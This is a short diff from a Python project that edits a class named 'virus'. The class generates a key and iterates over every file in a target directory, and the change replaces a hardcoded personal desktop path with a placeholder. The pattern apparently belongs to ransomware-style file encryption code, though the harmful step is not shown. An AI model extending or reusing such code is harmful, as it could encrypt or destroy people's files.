@@ -74,7 +74,7 @@ def get_username():
 class virus:
     def __init__(self):
         self.key = generate_key()
-        self.target_dir = r"C:\Users\youss\OneDrive\Desktop\testing"
+        self.target_dir = r"target_dir "
         for file in os.listdir(self.target_dir):
             file_path = os.path.join(self.target_dir, file)
             if os.path.isfile(file_path):
